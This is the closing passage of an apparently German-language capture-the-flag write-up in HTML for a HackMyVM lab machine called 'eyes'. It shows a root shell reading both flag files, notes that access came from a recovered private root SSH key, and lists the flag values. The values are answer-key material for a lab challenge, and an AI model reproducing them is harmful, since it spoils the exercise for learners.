+                         <pre>flag.sh  <span class="command">root.txt</span></pre>
+                          <div class="prompt">root@eyes:~# <span class="command">cat root.txt</span></div>
+                          <pre><span class="password">boomroothmv</span></pre>
+                           <div class="prompt">root@eyes:~# <span class="command">cd /home/monica</span></div>
+                           <div class="prompt">root@eyes:/home/monica# <span class="command">cat user.txt</span></div>
+                           <pre><span class="password">hmvpinkeyes</span></pre>
+                     </div>
+                 </div>
+                 <p class="analysis">**Analyse:**
+                1.  Wir speichern den privaten Root-Schlüssel auf unserer Maschine in der Datei `idl` und setzen die Berechtigungen.
+                2.  Wir verbinden uns per SSH als `root` zum Ziel `eyes.hmv` (Hostname korrigiert) unter Verwendung des Schlüssels (`-i idl`).
+                3.  Der Login ist erfolgreich, wir erhalten eine Root-Shell.
+                4.  Wir lesen die `root.txt` aus `/root/` und die `user.txt` aus `/home/monica/`.</p>
+                 <p class="evaluation">**Bewertung:** Vollständiger Root-Zugriff erlangt. Beide Flags erfolgreich gelesen.</p>
+                 <p class="recommendation">**Empfehlung (Pentester):** Bericht abschließen.
+                 **Empfehlung (Admin):** Alle identifizierten Schwachstellen beheben.</p>
+        </section>
+
+        <section id="flags">
+             <div class="flag-container">
+                <h2 class="flag-heading">Flags</h2>
+                <div class="flag-entry">
+                    <div class="flag-command">cat /home/monica/user.txt</div>
+                    <div class="flag-value"><span class="password">hmvpinkeyes</span></div>
+                </div>
+                <div class="flag-entry">
+                    <div class="flag-command">cat /root/root.txt</div>
+                    <div class="flag-value"><span class="password">boomroothmv</span></div>
+                </div>
+            </div>
+        </section>
+ 
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <p>Berichtsdatum: 6. September 2022</p> <!-- Datum aus vsftpd.log extrahiert -->
+    </footer>
+</body>
+</html>
